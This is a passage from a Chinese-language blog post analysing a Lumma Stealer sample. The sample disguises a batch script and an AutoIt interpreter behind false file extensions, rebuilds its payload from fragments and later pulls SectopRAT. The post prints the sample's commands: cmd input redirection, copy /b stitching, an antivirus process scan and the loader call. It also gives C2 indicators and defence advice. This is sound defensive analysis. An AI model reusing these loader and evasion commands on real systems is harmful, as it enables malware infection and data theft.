<p><img alt="A screenshot of a computer interface showing the extraction process of a file named &quot;SETUP.zip&quot; into the &quot;Downloads&quot; folder. The folder contents are visible. An information window displays details such as file size and extraction time, and an arrow points to extracted files labeled &quot;INSTALL LUMMA STEALER.&quot;" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 2260px) 2260px, 100vw"  data-astro-image="constrained" width="2260" height="1826" src="/nicky.cool/_astro/20260221221720657_5dz0C.webp" srcset="/nicky.cool/_astro/20260221221720657_Z2kiL4G.webp 640w, /nicky.cool/_astro/20260221221720657_1SjuVL.webp 750w, /nicky.cool/_astro/20260221221720657_2F5Vc.webp 828w, /nicky.cool/_astro/20260221221720657_1sVYlo.webp 1080w, /nicky.cool/_astro/20260221221720657_2u1kvJ.webp 1280w, /nicky.cool/_astro/20260221221720657_2nPG61.webp 1668w, /nicky.cool/_astro/20260221221720657_2vBKTa.webp 2048w, /nicky.cool/_astro/20260221221720657_5dz0C.webp 2260w"></p>
<h3 id="2-混淆核心指鹿为马的文件扩展名">2. 混淆核心：指鹿为马的文件扩展名<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 2. 混淆核心：指鹿为马的文件扩展名" data-pagefind-ignore="" href="#2-混淆核心指鹿为马的文件扩展名">#</a></h3>
<p>这是该样本最显著的特征。攻击者利用 Windows 默认隐藏已知文件扩展名的特性，将恶意脚本伪装成多媒体文件：</p>
<ul>
<li><strong><code>Enclosed.mpg</code></strong>：这并非视频文件，而是一个<strong>混淆的批处理脚本（Batch Script）</strong>。</li>
<li><strong><code>Dept.pif</code></strong>：实际上是合法的 <strong>AutoIt3.exe</strong> 解释器。</li>
<li><strong><code>.cda</code> 文件（如 <code>Motorcycle.cda</code>）</strong>：这并非 CD 音轨，而是被分割的二进制数据块或脚本片段。</li>
</ul>
<p><img alt="image-20260124225640333" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 634px) 634px, 100vw"  data-astro-image="constrained" width="634" height="367" src="/nicky.cool/_astro/20260221221726008_1t3S8r.webp" srcset="/nicky.cool/_astro/20260221221726008_1t3S8r.webp 634w"></p>
<h3 id="3-攻击链复盘基于残留日志">3. 攻击链复盘（基于残留日志）<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 3. 攻击链复盘（基于残留日志）" data-pagefind-ignore="" href="#3-攻击链复盘基于残留日志">#</a></h3>
<h4 id="第一阶段环境侦察与反杀箱">第一阶段：环境侦察与反杀箱<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 第一阶段：环境侦察与反杀箱" data-pagefind-ignore="" href="#第一阶段环境侦察与反杀箱">#</a></h4>
<p>Dropper 调用 <code>cmd.exe</code> 将 <code>Enclosed.mpg</code> 作为输入流执行：</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext"><code><div class="ec-line"><div class="code"><span style="--0:#dbd7caee;--1:#393a34">cmd.exe /c cmd &#x3C; Enclosed.mpg</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="cmd.exe /c cmd < Enclosed.mpg"><div></div></button></div></figure></div>
<p>解析出的脚本首先进行环境检查：</p>
<ul>
<li><strong>进程扫描</strong>：使用 <code>tasklist | findstr</code> 搜索常见的安全软件进程（如 <code>SophosHealth</code>, <code>bdservicehost</code> (BitDefender), <code>AvastUI</code>, <code>ekrn</code> (ESET)）。</li>
<li><strong>逻辑判断</strong>：如果发现上述进程，脚本可能会静默退出或改变行为；若未发现，则继续设定变量 <code>Set CJykOoMQV=AutoIt3.exe</code>。</li>
</ul>
<h4 id="第二阶段文件拼接file-stitching">第二阶段：文件拼接（File Stitching）<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 第二阶段：文件拼接（File Stitching）" data-pagefind-ignore="" href="#第二阶段文件拼接file-stitching">#</a></h4>
<p>这是对抗静态扫描的关键步骤。恶意载荷并未作为一个完整文件存在，而是被切碎隐藏。脚本使用 <code>copy /b</code> 命令将多个分散的文件重新组装：</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext"><code><div class="ec-line"><div class="code"><span style="--0:#dbd7caee;--1:#393a34">copy /b /y 162936\Dept.pif + Crack + Disabilities + ... + Serbia 162936\Dept.pif</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="copy /b /y 162936\Dept.pif + Crack + Disabilities + ... + Serbia 162936\Dept.pif"><div></div></button></div></figure></div>
<p>或者将多个 <code>.cda</code> 文件合并：</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext"><code><div class="ec-line"><div class="code"><span style="--0:#dbd7caee;--1:#393a34">copy /b /y ..\Canada.cda + ..\Snowboard.cda + ... + ..\Qc.cda D</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="copy /b /y ..\Canada.cda + ..\Snowboard.cda + ... + ..\Qc.cda D"><div></div></button></div></figure></div>
<p><strong>分析结论</strong>：攻击者将一个大的恶意二进制文件（可能是最终的 AutoIt 脚本 <code>.a3x</code> 或加密的 Payload）切割成名为 <code>Crack</code>, <code>Wallet</code>, <code>Love</code> 等看似无害的小文件。只有在运行时，它们才会被拼凑成完整的武器。</p>
<h4 id="第三阶段白利用加载autoit-loader">第三阶段：白利用加载（AutoIt Loader）<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 第三阶段：白利用加载（AutoIt Loader）" data-pagefind-ignore="" href="#第三阶段白利用加载autoit-loader">#</a></h4>
<p>最终，脚本会执行以下命令：</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext"><code><div class="ec-line"><div class="code"><span style="--0:#dbd7caee;--1:#393a34">Dept.pif N</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="Dept.pif N"><div></div></button></div></figure></div>
<p>其中 <code>Dept.pif</code> 是重命名后的 AutoIt3 解释器（白名单程序），而 <code>N</code>（或 <code>N.a3x</code>）是刚刚拼接好的恶意脚本。利用 AutoIt 执行恶意代码可以有效绕过部分基于特征码的查杀。</p>
<p><img alt="image-20260124225700727" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 644px) 644px, 100vw"  data-astro-image="constrained" width="644" height="118" src="/nicky.cool/_astro/20260221225948036_1VBiAH.webp" srcset="/nicky.cool/_astro/20260221225948036_Z5fgAL.webp 640w, /nicky.cool/_astro/20260221225948036_1VBiAH.webp 644w"></p>
<h3 id="4-最终意图lumma-引导-sectoprat">4. 最终意图：Lumma 引导 SectopRAT<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 4. 最终意图：Lumma 引导 SectopRAT" data-pagefind-ignore="" href="#4-最终意图lumma-引导-sectoprat">#</a></h3>
<p>根据关联情报（IOC），该样本不仅释放 Lumma Stealer 窃取数据，还会作为下载器拉取 <strong>SectopRAT (ArechClient2)</strong>。</p>
<ul>
<li><strong>持久化</strong>：在启动文件夹创建 <code>NanoCraft.url</code>，指向 <code>%LocalAppData%</code> 下的恶意脚本，实现开机自启。</li>
<li><strong>C2 通信</strong>：尽管 C2 失活，但日志显示它曾试图连接 <code>5.10.250.239:9000</code>（SectopRAT 的典型端口）以及多个 <code>.ru</code> 结尾的域名（Lumma 的典型 C2）。</li>
</ul>
<p><img alt="Screenshot of a Wireshark application displaying network traffic data filtered to show interaction from a RAT (Remote Access Trojan) installer, with columns for timestamp, handshake type, host names, and other data, highlighting malicious activities. Text indicates the Lumma Stealer C2 traffic, the request for SECTOP RAT installer and the SECTOP RAT C2 traffic. " loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 2884px) 2884px, 100vw"  data-astro-image="constrained" width="2884" height="1524" src="/nicky.cool/_astro/20260221221730399_1g5FUa.webp" srcset="/nicky.cool/_astro/20260221221730399_ZxWVF0.webp 640w, /nicky.cool/_astro/20260221221730399_27ahfw.webp 750w, /nicky.cool/_astro/20260221221730399_XhvHs.webp 828w, /nicky.cool/_astro/20260221221730399_Z1DJUIM.webp 1080w, /nicky.cool/_astro/20260221221730399_Z1rFfXC.webp 1280w, /nicky.cool/_astro/20260221221730399_23ONcd.webp 1668w, /nicky.cool/_astro/20260221221730399_ZomJ2f.webp 2048w, /nicky.cool/_astro/20260221221730399_18xrAt.webp 2560w, /nicky.cool/_astro/20260221221730399_1g5FUa.webp 2884w"></p>
<p><img alt="Screenshot of a Windows computer screen showing the process of creating a persistent SECTOP RAT on an infected host, with files named AutoIt3.exe being highlighted and details displayed in various open windows." loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 1920px) 1920px, 100vw"  data-astro-image="constrained" width="1920" height="998" src="/nicky.cool/_astro/20260221225909641_Z1sptCP.webp" srcset="/nicky.cool/_astro/20260221225909641_Z2ccsiX.webp 640w, /nicky.cool/_astro/20260221225909641_B7HOf.webp 750w, /nicky.cool/_astro/20260221225909641_Z16B9um.webp 828w, /nicky.cool/_astro/20260221225909641_20bQLl.webp 1080w, /nicky.cool/_astro/20260221225909641_1x9Wg5.webp 1280w, /nicky.cool/_astro/20260221225909641_Z1qDlBk.webp 1668w, /nicky.cool/_astro/20260221225909641_Z1sptCP.webp 1920w"></p>
<h2 id="总结与防御">总结与防御<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 总结与防御" data-pagefind-ignore="" href="#总结与防御">#</a></h2>
<p>通过对这两类样本的分析，我们可以归纳出 Lumma Stealer 的演进逻辑：</p>
<ol>
<li><strong>入口多样化</strong>：从传统的“诱导下载”向“社会工程学劫持（剪贴板）”转变，攻击者的手段更加隐蔽且互动性更强。</li>
<li><strong>对抗静态分析</strong>：类型二样本展示了极高的对抗水平，通过<strong>文件碎片化拼接</strong>和<strong>扩展名伪装</strong>（<code>.mpg</code>, <code>.cda</code>），使得单纯的文件扫描很难在早期发现完整的恶意 Payload。</li>
<li><strong>工具链滥用</strong>：无论是 PowerShell、Python 还是 AutoIt，攻击者都在滥用合法的解释器来执行恶意逻辑（Living off the Land），这给基于行为的防御带来了挑战。</li>
</ol>
<p><strong>防御建议：</strong></p>
<ul>
<li><strong>警惕剪贴板操作</strong>：任何网页提示需要“Win+R”并粘贴内容的，100% 为恶意攻击。</li>
<li><strong>显示文件扩展名</strong>：在 Windows 设置中开启“显示已知文件类型的扩展名”，可以轻易识破 <code>.mpg</code> 实际是 <code>.bat</code> 或 <code>.cmd</code> 的伪装。</li>
</ul>  </article>   <image-viewer data-selector="article" data-options="{&#34;title&#34;:0,&#34;navbar&#34;:0}"></image-viewer> <script type="module" src="/nicky.cool/_astro/ImageViewer.astro_astro_type_script_index_0_lang.BbQHAm9u.js"></script>  <!-- Share --> <footer class="slide-enter animate-delay-1000! prose mx-auto mt-8 print:hidden"> <span class="font-mono op-50">&gt; </span> <span class="op-50">share on</span>  <a class="op-60 no-underline hover:op-100 op-50!" href="https://twitter.com/intent/tweet?text=Reading%20%40noknoku07_nok's%20https%3A%2F%2Fnickyl07.github.io%2Fnicky.cool%2Fblog%2Flumma-stealer%25E4%25BB%258E%25E5%2589%25AA%25E8%25B4%25B4%25E6%259D%25BF%25E5%258A%25AB%25E6%258C%2581%25E5%2588%25B0%25E5%25A4%258D%25E6%259D%2582%25E5%25A4%259A%25E9%2598%25B6%25E5%258A%25A0%25E8%25BD%25BD%25E7%259A%2584%25E6%25BC%2594%25E8%25BF%259B%2F%0A%0AI%20think..." title="Tweet this post" aria-label="Tweet this post">  twitter</a>  <br> <span class="font-mono op-50">&gt; </span> <a class="op-60 no-underline hover:op-100 font-mono op-50!" href="/nicky.cool/blog/">  cd ..</a> </footer> <!-- Comments --> <div class="prose mx-auto mt-8"> <hr> <div class="giscus"></div> <script type="module">const e={giscus:[!0,{"data-repo":"lin-stephanie/astro-antfustyle-theme","data-repo-id":"R_kgDOLylKbA","data-category":"Giscus","data-category-id":"DIC_kwDOLylKbM4Cpugn","data-mapping":"title","data-strict":"0","data-reactions-enabled":"1","data-emit-metadata":"0","data-input-position":"bottom","data-lang":"zh"}]},a=`${location.origin}/giscus/light.css`,i=`${location.origin}/giscus/dark.css`,o=Array.isArray(e.giscus)&&e.giscus[1],s=document.createElement("script");Object.entries({...o,id:"giscus-script",src:"https://giscus.app/client.js",crossOrigin:"anonymous",async:""}).forEach(([t,c])=>{s.setAttribute(t,c)});const r=()=>{document.querySelectorAll("iframe.giscus-frame").forEach(t=>t.remove()),document.querySelectorAll("script#giscus-script").forEach(t=>t.remove())},n=()=>{if(!document.querySelector(".giscus"))return;const t=s.cloneNode(!0);t.setAttribute("data-theme",document.documentElement.classList.contains("dark")?i:a),document.body.appendChild(t)};document.addEventListener("astro:before-swap",r);document.addEventListener("astro:page-load",n);</script> </div> </main> <!-- Footer --> <footer class="slide-enter animate-delay-1600! px-7 mt-auto mb-8"> <div class="prose mx-auto op-50"> <div class="flex lt-sm:flex-col items-center text-sm whitespace-nowrap"> <span>© 2026 NickyWU</span> <span class="lt-sm:hidden">&nbsp;|&nbsp;</span> <span>
Powered by
<a class="op-60 no-underline hover:op-100 op-100! color-[--fg]!" href="https://github.com/lin-stephanie/astro-antfustyle-theme">  
Astro AntfuStyle Theme
</a> </span> </div> </div> </footer> <button id="to-top-button" class="z-50 fixed right-5 bottom-6
    w-10 h-10 rounded-full
    op-0 pointer-events-none op-transition
    lt-lgp:op-50! lt-lgp:bg-#8883 lt-lgp:dark:bg-#8886 lt-lgp:pointer-events-auto!
    hover:op-100! hover:bg-#8883 print:hidden" title="Scroll to top"> <div u-i-ri-arrow-up-line></div> </button> <script type="module">document.addEventListener("astro:page-load",()=>{const o=()=>{window.scrollTo({top:0})};document.getElementById("to-top-button")?.addEventListener("click",o)});const e=()=>{const t=document.getElementById("to-top-button");t&&window.matchMedia("(min-width: 1024px)").matches&&((window.scrollY||document.documentElement.scrollTop)<=300?(t.style.opacity="0",t.style.pointerEvents="none"):(t.style.opacity="0.3",t.style.pointerEvents="auto"))};window.addEventListener("scroll",e);</script> <!-- Panel Backdrop (on mobile) --> <div id="backdrop" class="hidden z-75 fixed inset-0 bg-[#ffffffcc] dark:bg-[#000000cc]" aria-hidden="true"></div> <script type="module" src="/nicky.cool/_astro/Backdrop.astro_astro_type_script_index_0_lang.CFnpENJb.js"></script> <!-- Progress Bar --> <script type="module" src="/nicky.cool/_astro/BaseLayout.astro_astro_type_script_index_0_lang.Bg06K9ze.js"></script> </body> </html>